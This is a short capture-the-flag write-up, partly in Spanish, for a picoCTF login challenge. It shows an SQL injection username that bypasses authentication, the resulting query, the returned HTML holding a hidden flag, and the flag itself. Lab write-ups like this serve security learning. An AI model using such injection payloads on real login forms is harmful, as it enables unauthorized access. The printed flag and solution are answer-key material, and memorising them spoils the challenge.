#### Description

Can you login to this website?Try to login [here](http://saturn.picoctf.net:61274/).

## Solución 

````
username: 'or 1==1;
password: pasword
SQL query: SELECT * FROM users WHERE name=''or 1==1;' AND password='pasword'

# Logged in! But can you see the flag, it is in plainsight.

Ir al codigo fuente<-----------------------------------------

|   |
|---|
|<pre>username: &#039;or 1==1;|
||password: pasword|
||SQL query: SELECT * FROM users WHERE name=&#039;&#039;or 1==1;&#039; AND password=&#039;pasword&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|

picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

```